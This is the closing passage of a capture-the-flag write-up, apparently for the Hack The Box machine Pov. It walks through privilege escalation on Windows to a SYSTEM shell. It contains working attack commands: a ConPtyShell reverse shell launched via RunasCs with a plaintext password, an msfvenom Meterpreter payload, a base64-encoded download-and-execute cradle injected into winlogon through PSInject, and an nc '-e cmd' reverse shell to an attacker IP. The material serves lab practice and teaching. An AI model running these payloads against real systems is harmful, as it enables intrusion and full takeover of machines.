SemanticString__Fragment--ColorPurple"><span>C:\users\alaading\desktop&gt;</span></mark></span><span class="SemanticString"><span> powershell

Windows PowerShell 
Copyright (C) Microsoft Corporation. All rights reserved.

</span></span><span class="SemanticString"><mark class="SemanticString__Fragment SemanticString__Fragment--HighlightedColor SemanticString__Fragment--ColorPurple"><span>C:\users\alaading\desktop&gt;</span></mark></span><span class="SemanticString"><span> curl http://10.10.14.5:8000/EnableAllTokenPrivs.ps1 -o EnableAllTokenPrivs.ps1

</span></span><span class="SemanticString"><mark class="SemanticString__Fragment SemanticString__Fragment--HighlightedColor SemanticString__Fragment--ColorPurple"><span>C:\users\alaading\desktop&gt;</span></mark></span><span class="SemanticString"><span> .\EnableAllTokenPrivs.ps1

</span></span><span class="SemanticString"><mark class="SemanticString__Fragment SemanticString__Fragment--HighlightedColor SemanticString__Fragment--ColorPurple"><span>C:\users\alaading\desktop&gt;</span></mark></span><span class="SemanticString"><span> whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                    State  
============================= ============================== =======
SeDebugPrivilege              Debug programs                 Enabled
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set Enabled</span></span></span></code></pre><div id="https://www.notion.so/655d288d93844b5e8510bc91c92a76c1" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"></span></p></div><div id="https://www.notion.so/f530019377b64bb78bc2b3f6628ecc16" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString"><strong class="SemanticString__Fragment SemanticString__Fragment--Bold">Option 2: ConPtyShell.exe</strong></span></span></p></div><div id="https://www.notion.so/d5234cb2c90f45f6a39b2ca8126dd2f2" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString"><a class="SemanticString__Fragment SemanticString__Fragment--Link" href="https://github.com/antonioCoco/ConPtyShell">ConPtyShell</a></span><span class="SemanticString"> is a fully-interactive Windows reverse shell. Although a bit slow, it is more stable, and provides several additional features such as syntax highlighting and PTY support. Most importantly, it automatically enables most privileges the user has.</span></span></p></div><div id="https://www.notion.so/3ea70669ea2e43e99a9df7cea5cb277c" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">I’ll first set up the listener with the following command:</span></span></p></div><div id="https://www.notion.so/c2dd47454c6a43d4bb332632785453d8" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">$ stty raw echo; (stty size; cat) | nc -lvnp 8001</code></span></span></p></div><div id="https://www.notion.so/2d0b8506d4b04219a4296cd096aa918b" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"></span></p></div><div id="https://www.notion.so/21f5e77ffdb64c8a9d82c840edf59a7b" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">Then from </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">sfitz</code></span><span class="SemanticString">&#x27;s shell, I’ll downlowd the ConPtyShell binary and background run it with </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">RunasCs</code></span><span class="SemanticString">:</span></span></p></div><pre id="https://www.notion.so/241d9ed483c64a848b93f5374d21e4df" class="Code Code--NoWrap"><code><span class="SemanticStringArray"><span class="SemanticString"><mark class="SemanticString__Fragment SemanticString__Fragment--HighlightedColor SemanticString__Fragment--ColorPurple"><span>C:\users\sfitz\desktop&gt;</span></mark></span><span class="SemanticString"><span> curl http://10.10.14.5:8000/ConPtyShell.exe -o c:\windows\temp\ConPtyShell.exe

</span></span><span class="SemanticString"><mark class="SemanticString__Fragment SemanticString__Fragment--HighlightedColor SemanticString__Fragment--ColorPurple"><span>C:\users\sfitz\desktop&gt;</span></mark></span><span class="SemanticString"><span> icacls c:\windows\temp\ConPtyShell.exe /grant Everyone:F

processed file: c:\windows\temp\ConPtyShell.exe
Successfully processed 1 files; Failed processing 0 files

</span></span><span class="SemanticString"><mark class="SemanticString__Fragment SemanticString__Fragment--HighlightedColor SemanticString__Fragment--ColorPurple"><span>C:\users\sfitz\desktop&gt;</span></mark></span><span class="SemanticString"><span> .\RunasCs.exe alaading f8gQ8fynP44ek1m3 &quot;cmd /c C:\windows\temp\ConPtyShell.exe 10.10.14.5 8001&quot; -t 0

[+] Running in session 0 with process function CreateProcessWithLogonW()
[+] Using Station\Desktop: Service-0x0-a4676$\Default
[+] Async process &#x27;C:\Windows\system32\cmd.exe /c C:\windows\temp\ConPtyShell.exe 10.10.14.5 8001&#x27; with pid 1172 created in background.</span></span></span></code></pre><div id="https://www.notion.so/e628cae995214b6e8ef1a034d9738ba4" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">It also sends back a shell with </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">SeDebugPrivilege</code></span><span class="SemanticString"> enabled.</span></span></p></div><div id="https://www.notion.so/cb47311f0cd84f53954698ad5e78acea" class="Image Image--PageWidth"><figure><a href="https://www.notion.so/signed/https%3A%2F%2Fprod-files-secure.s3.us-west-2.amazonaws.com%2F2ec3d00f-4cb5-49d6-a169-ee9c29521592%2Fafaa71a2-cbe5-41c3-9f91-06ec698fa367%2FUntitled.png?width=1075&amp;table=block&amp;id=cb47311f-0cd8-4f53-9546-98ad5e78acea"><img src="https://www.notion.so/signed/https%3A%2F%2Fprod-files-secure.s3.us-west-2.amazonaws.com%2F2ec3d00f-4cb5-49d6-a169-ee9c29521592%2Fafaa71a2-cbe5-41c3-9f91-06ec698fa367%2FUntitled.png?width=1075&amp;table=block&amp;id=cb47311f-0cd8-4f53-9546-98ad5e78acea" style="width:100%"/></a><figcaption><span class="SemanticStringArray"></span></figcaption></figure></div><div id="https://www.notion.so/5070a0f9144d45a1bb4c104cc83540b3" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">For some reasons the last privilege did not get enabled, but it doesn’t matter in this case.</span></span></p></div><div id="https://www.notion.so/a87afb5cc1b44407a6c4e8c4ad84d6b7" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"></span></p></div><div id="https://www.notion.so/2fbefbc0208c4d1891efaac2b59237ba" class="Divider"></div><h3 id="https://www.notion.so/318b72469a2740e49e1aa5d59ce64081" class="ColorfulBlock ColorfulBlock--ColorDefault Heading Heading--3"><a class="Anchor" href="#https://www.notion.so/318b72469a2740e49e1aa5d59ce64081"><svg width="16" height="16" viewBox="0 0 16 16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a><span class="SemanticStringArray"><span class="SemanticString">Privilege Escalation:</span></span></h3><div id="https://www.notion.so/bb45fecda2884b8da616e85bef8f2335" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">With </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">SeDebugPrivilege</code></span><span class="SemanticString"> now enabled, I can takeover SYSTEM processes for escalation. I’ll target </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">winlogon.exe</code></span><span class="SemanticString"> here, and grabbed its PID with the </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">tasklist</code></span><span class="SemanticString"> command:</span></span></p></div><pre id="https://www.notion.so/961964dfe0a24e86a981d94915bbe9c9" class="Code Code--NoWrap"><code><span class="SemanticStringArray"><span class="SemanticString"><mark class="SemanticString__Fragment SemanticString__Fragment--HighlightedColor SemanticString__Fragment--ColorPurple"><span>C:\users\alaading\desktop&gt;</span></mark></span><span class="SemanticString"><span> tasklist /svc

Image Name                     PID Services
========================= ======== ============================================
System Idle Process              0 N/A
System                           4 N/A
Registry                        88 N/A
smss.exe                       296 N/A
csrss.exe                      376 N/A
csrss.exe                      480 N/A
wininit.exe                    496 N/A
winlogon.exe                   544 N/A
services.exe                   620 N/A
lsass.exe                      640 KeyIso, SamSs
svchost.exe                    756 PlugPlay
..SNIP..</span></span></span></code></pre><div id="https://www.notion.so/ec968ba72d974dd1ae4a0f847054c0d4" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"></span></p></div><div id="https://www.notion.so/b2b2755181a943d782d7140a022e5975" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString"><strong class="SemanticString__Fragment SemanticString__Fragment--Bold">Option 1: Using Metasploit</strong></span></span></p></div><div id="https://www.notion.so/f2baaae94de54f8fafad530930ee0385" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">Perhaps the easiest way to do this is with Meterpreter, as it has a </span><span class="SemanticString"><a class="SemanticString__Fragment SemanticString__Fragment--Link" href="https://www.offsec.com/metasploit-unleashed/meterpreter-basics/#migrate">migrate</a></span><span class="SemanticString"> function that automatically gets me a SYSTEM shell. First, I’ll use </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">msfvenom</code></span><span class="SemanticString"> to create a reverse Meterpreter shell payload in EXE:</span></span></p></div><pre id="https://www.notion.so/f95ba18f090349e09469655b29bd2399" class="Code Code--NoWrap"><code><span class="SemanticStringArray"><span class="SemanticString"><mark class="SemanticString__Fragment SemanticString__Fragment--HighlightedColor SemanticString__Fragment--ColorOrange"><span>┌──(ch3ng㉿localhost)-[~/machines/pov]
└─$</span></mark></span><span class="SemanticString"><span> msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.14.5 LPORT=8001 -f exe -o meterpreter.exe

[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 510 bytes
Final size of exe file: 7168 bytes
Saved as: meterpreter.exe</span></span></span></code></pre><div id="https://www.notion.so/a8104eccf6df42869f42305257feddff" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">Then configure the Metasploit listener:</span></span></p></div><pre id="https://www.notion.so/2a40a23cb96940a1ac204cbd3f42b53a" class="Code Code--NoWrap"><code><span class="SemanticStringArray"><span class="SemanticString"><mark class="SemanticString__Fragment SemanticString__Fragment--HighlightedColor SemanticString__Fragment--ColorOrange"><span>┌──(ch3ng㉿localhost)-[~/machines/pov]
└─$</span></mark></span><span class="SemanticString"><span> msfconsole -q

</span></span><span class="SemanticString"><mark class="SemanticString__Fragment SemanticString__Fragment--HighlightedColor SemanticString__Fragment--ColorGreen"><span>msf6 &gt;</span></mark></span><span class="SemanticString"><span> use exploit/multi/handler

[*] Using configured payload generic/shell_reverse_tcp

</span></span><span class="SemanticString"><mark class="SemanticString__Fragment SemanticString__Fragment--HighlightedColor SemanticString__Fragment--ColorGreen"><span>msf6 exploit(multi/handler) &gt;</span></mark></span><span class="SemanticString"><span> set payload windows/x64/meterpreter/reverse_tcp

payload =&gt; windows/x64/meterpreter/reverse_tcp

</span></span><span class="SemanticString"><mark class="SemanticString__Fragment SemanticString__Fragment--HighlightedColor SemanticString__Fragment--ColorGreen"><span>msf6 exploit(multi/handler) &gt;</span></mark></span><span class="SemanticString"><span> set lhost tun0

lhost =&gt; tun0

</span></span><span class="SemanticString"><mark class="SemanticString__Fragment SemanticString__Fragment--HighlightedColor SemanticString__Fragment--ColorGreen"><span>msf6 exploit(multi/handler) &gt;</span></mark></span><span class="SemanticString"><span> set lport 8001

lport =&gt; 8001

</span></span><span class="SemanticString"><mark class="SemanticString__Fragment SemanticString__Fragment--HighlightedColor SemanticString__Fragment--ColorGreen"><span>msf6 exploit(multi/handler) &gt;</span></mark></span><span class="SemanticString"><span> run

[*] Started reverse TCP handler on 10.10.14.5:8001</span></span></span></code></pre><div id="https://www.notion.so/b57276a27b494f4590fd431224403b19" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">And finally upload and run the executable as a background job:</span></span></p></div><pre id="https://www.notion.so/0c8e0cab304c4e2f8e2eb2ff466e5f5d" class="Code Code--NoWrap"><code><span class="SemanticStringArray"><span class="SemanticString"><mark class="SemanticString__Fragment SemanticString__Fragment--HighlightedColor SemanticString__Fragment--ColorPurple"><span>C:\users\alaading\desktop&gt;</span></mark></span><span class="SemanticString"><span> Start-Job -ScriptBlock {c:\users\alaading\desktop\meterpreter.exe}

Id     Name            PSJobTypeName   State         HasMoreData     Location             Command
--     ----            -------------   -----         -----------     --------             -------
5      Job5            BackgroundJob   Running       True            localhost            c:\users\alaading\desk...</span></span></span></code></pre><div id="https://www.notion.so/83ac98be1c7440e5b0941677f750ee76" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">It successfully sends back a Meterpreter shell session.</span></span></p></div><pre id="https://www.notion.so/8f2c13ed02f54df6a98240cf04a8c5ba" class="Code Code--NoWrap"><code><span class="SemanticStringArray"><span class="SemanticString"><span>[*] Started reverse TCP handler on 10.10.14.5:8001 
[*] Sending stage (200774 bytes) to 10.129.154.68
[*] Meterpreter session 1 opened (10.10.14.5:8001 -&gt; 10.129.154.68:49692) at 2024-02-09 20:43:37 +1030

</span></span><span class="SemanticString"><mark class="SemanticString__Fragment SemanticString__Fragment--HighlightedColor SemanticString__Fragment--ColorGreen"><span>meterpreter &gt;</span></mark></span><span class="SemanticString"><span> sysinfo

Computer        : POV
OS              : Windows Server 2019 (10.0 Build 17763).
Architecture    : x64
System Language : en_US
Meterpreter     : x64/windows</span></span></span></code></pre><div id="https://www.notion.so/9f8eb3de9deb4537a04b1451f6520c88" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">The final step is to simply provide the PID of </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">winlogon.exe</code></span><span class="SemanticString">, and the </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">migrate</code></span><span class="SemanticString"> function would takeover the process, resulting in a SYSTEM shell.</span></span></p></div><pre id="https://www.notion.so/77996364cc064ca09cf675a070b5f7af" class="Code Code--NoWrap"><code><span class="SemanticStringArray"><span class="SemanticString"><mark class="SemanticString__Fragment SemanticString__Fragment--HighlightedColor SemanticString__Fragment--ColorGreen"><span>meterpreter &gt;</span></mark></span><span class="SemanticString"><span> migrate 544

[*] Migrating from 2216 to 544...
[*] Migration completed successfully.

</span></span><span class="SemanticString"><mark class="SemanticString__Fragment SemanticString__Fragment--HighlightedColor SemanticString__Fragment--ColorGreen"><span>meterpreter &gt;</span></mark></span><span class="SemanticString"><span> shell

Process 3980 created.
Channel 1 created.
Microsoft Windows [Version 10.0.17763.5329]
(c) 2018 Microsoft Corporation. All rights reserved.

</span></span><span class="SemanticString"><mark class="SemanticString__Fragment SemanticString__Fragment--HighlightedColor SemanticString__Fragment--ColorPurple"><span>c:\windows\system32&gt;</span></mark></span><span class="SemanticString"><span> whoami

nt authority\system</span></span></span></code></pre><div id="https://www.notion.so/2a62aa7d0cd14aebafb60126f2cb5b93" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"></span></p></div><div id="https://www.notion.so/dc37c2ae8c9542b18c8d1772a5865b02" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString"><strong class="SemanticString__Fragment SemanticString__Fragment--Bold">Option 2: Public Exploits</strong></span></span></p></div><div id="https://www.notion.so/30d81e4f0f394f828a684236899abdd4" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">Exploiting this manually is a bit more tricky, as a few of the public tools just refused to work on this box. I tried </span><span class="SemanticString"><a class="SemanticString__Fragment SemanticString__Fragment--Link" href="https://github.com/decoder-it/psgetsystem">psgetsys.ps1</a></span><span class="SemanticString"> and </span><span class="SemanticString"><a class="SemanticString__Fragment SemanticString__Fragment--Link" href="https://github.com/daem0nc0re/PrivFu/tree/main/PrivilegedOperations/SeDebugPrivilegePoC">PrivFu’s SeDebugPrivilegePoC</a></span><span class="SemanticString">, but both resulted in failures. The best I achieved is to get it to connect back to my listener, but the shell died immediately after the connection.</span></span></p></div><div id="https://www.notion.so/b2c527fc60334f75b46322215939e94a" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">Eventually I came across </span><span class="SemanticString"><a class="SemanticString__Fragment SemanticString__Fragment--Link" href="https://github.com/EmpireProject/PSInject/tree/master">PSInject</a></span><span class="SemanticString">, which, as the name implies, injects PowerShell commands into targeted processes. I’ll download the script and import the module:</span></span></p></div><pre id="https://www.notion.so/9c8c713bab7e42fa96b71310d39944ea" class="Code Code--NoWrap"><code><span class="SemanticStringArray"><span class="SemanticString"><mark class="SemanticString__Fragment SemanticString__Fragment--HighlightedColor SemanticString__Fragment--ColorPurple"><span>C:\users\alaading\desktop&gt;</span></mark></span><span class="SemanticString"><span> curl http://10.10.14.5:8000/Invoke-PSInject.ps1 -o Invoke-PSInject.ps1

</span></span><span class="SemanticString"><mark class="SemanticString__Fragment SemanticString__Fragment--HighlightedColor SemanticString__Fragment--ColorPurple"><span>C:\users\alaading\desktop&gt;</span></mark></span><span class="SemanticString"><span> . .\Invoke-PSInject.ps1</span></span></span></code></pre><div id="https://www.notion.so/8f621ac5948e407ca95dc725ec968f8f" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">It requires two arguments: </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">Procid</code></span><span class="SemanticString">, which is the ID of the target process; and </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">PoshCode</code></span><span class="SemanticString">, which is the PowerShell command encoded as a base64 string.</span></span></p></div><div id="https://www.notion.so/71b0b6bd374a445ba82407a0a0d8260a" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">I’ll first encode my payload, which basically runs a remote PowerShell script hosted on my HTTP server. Since it’s a Windows system, I’ll have to convert it into UTF16 little endian before base64 encoding.</span></span></p></div><pre id="https://www.notion.so/4ccd5cf279db4f98ab1dcfe6d98255f5" class="Code Code--NoWrap"><code><span class="SemanticStringArray"><span class="SemanticString"><mark class="SemanticString__Fragment SemanticString__Fragment--HighlightedColor SemanticString__Fragment--ColorOrange"><span>┌──(ch3ng㉿localhost)-[~/machines/pov]
└─$</span></mark></span><span class="SemanticString"><span> echo -n &#x27;IWR http://10.10.14.5:8000/script.ps1 -UseBasicParsing | IEX&#x27; | iconv -t utf16le | base64 -w0

SQBXAFIAIABoAHQAdABwADoALwAvADEAMAAuADEAMAAuADEANAAuADUAOgA4ADAAMAAwAC8AcwBjAHIAaQBwAHQALgBwAHMAMQAgAC0AVQBzAGUAQgBhAHMAaQBjAFAAYQByAHMAaQBuAGcAIAB8ACAASQBFAFgA</span></span></span></code></pre><div id="https://www.notion.so/37c003b0373f43e1baf993f9a22b6cd5" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">Then I ran the </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">Invoke-PSInject</code></span><span class="SemanticString">, providing the encoded PowerShell commands.</span></span></p></div><pre id="https://www.notion.so/c6c5784cc03e44c38d2dcf53c6697afa" class="Code Code--NoWrap"><code><span class="SemanticStringArray"><span class="SemanticString"><mark class="SemanticString__Fragment SemanticString__Fragment--HighlightedColor SemanticString__Fragment--ColorPurple"><span>C:\users\alaading\desktop&gt;</span></mark></span><span class="SemanticString"><span> Invoke-PSInject -Procid 544 -PoshCode SQBXAFIAIABoAHQAdABwADoALwAvADEAMAAuADEAMAAuADEANAAuADUAOgA4ADAAMAAwAC8AcwBjAHIAaQBwAHQALgBwAHMAMQAgAC0AVQBzAGUAQgBhAHMAaQBjAFAAYQByAHMAaQBuAGcAIAB8ACAASQBFAFgA
</span></span></span></code></pre><div id="https://www.notion.so/1de5085e6b64457f91d1346634a8d1ab" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">A GET request to </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">/script.ps1</code></span><span class="SemanticString"> is detected, indicating my payload ran successfully. Nothing happened, since this script is empty at the moment.</span></span></p></div><pre id="https://www.notion.so/b53bd9f0ee2a4fa593322194208a49df" class="Code Code--NoWrap"><code><span class="SemanticStringArray"><span class="SemanticString"><span>10.129.154.68 - - [10/Feb/2024 11:08:35] &quot;GET /script.ps1 HTTP/1.1&quot; 200 -</span></span></span></code></pre><div id="https://www.notion.so/f03668179b9745e9b4676a2df3ef6f43" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">For a reverse shell, I’ll setup a listener, and add the following into </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">script.ps1</code></span><span class="SemanticString">.</span></span></p></div><pre id="https://www.notion.so/67e2a0b466f84ac8bd52fc876e5e548c" class="Code Code--NoWrap"><code><span class="SemanticStringArray"><span class="SemanticString"><span>c:\windows\temp\nc64<span class="token punctuation">.</span>exe 10<span class="token punctuation">.</span>10<span class="token punctuation">.</span>14<span class="token punctuation">.</span>5 8001 <span class="token operator">-</span>e cmd</span></span></span></code></pre><div id="https://www.notion.so/9b0e53c73b6743ff846b786c2a4c5a52" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">Running the </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">Invoke-PSInject</code></span><span class="SemanticString"> command above would return me a SYSTEM shell:</span></span></p></div><pre id="https://www.notion.so/a2cf682922c74e739952cdd19caac2d6" class="Code Code--NoWrap"><code><span class="SemanticStringArray"><span class="SemanticString"><mark class="SemanticString__Fragment SemanticString__Fragment--HighlightedColor SemanticString__Fragment--ColorOrange"><span>┌──(ch3ng㉿localhost)-[~/machines/pov]
└─$</span></mark></span><span class="SemanticString"><span> sudo nc -lvnp 8001   

listening on [any] 8001 ...
connect to [10.10.14.5] from (UNKNOWN) [10.129.154.68] 49682
Microsoft Windows [Version 10.0.17763.5329]
(c) 2018 Microsoft Corporation. All rights reserved.
Not enough memory resources are available to process this command.

</span></span><span class="SemanticString"><mark class="SemanticString__Fragment SemanticString__Fragment--HighlightedColor SemanticString__Fragment--ColorPurple"><span>C:\windows\system32&gt;</span></mark></span><span class="SemanticString"><span> whoami

nt authority\system</span></span></span></code></pre><div id="https://www.notion.so/4fc8cd462cbb4e4d8ad960a236a0f5aa" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"></span></p></div><div id="https://www.notion.so/80cb66c41e3c4ea39e6eb1fb30af565d" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString"><strong class="SemanticString__Fragment SemanticString__Fragment--Bold">Root Flag:</strong></span></span></p></div><pre id="https://www.notion.so/5d24821122594413b5b0169425d120fb" class="Code Code--NoWrap"><code><span class="SemanticStringArray"><span class="SemanticString"><mark class="SemanticString__Fragment SemanticString__Fragment--HighlightedColor SemanticString__Fragment--ColorPurple"><span>C:\users\administrator\desktop&gt;</span></mark></span><span class="SemanticString"><span> type root.txt

11dde803************************</span></span></span></code></pre><div id="https://www.notion.so/170fcdcdfa6742af8de863f1e4ae1c1b" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"></span></p></div><div id="https://www.notion.so/3a56902ff3a74dee83ad008c0c439d8d" class="Divider"></div></article>
  <footer class="Footer">
  <div>&copy; C:\Users\ch3ng &gt;_ 2025</div>
  <div>&centerdot;</div>
  <div>Powered by <a href="https://github.com/dragonman225/notablog" target="_blank"
      rel="noopener noreferrer">Notablog</a>.
  </div>
</footer>

</body>

</html>
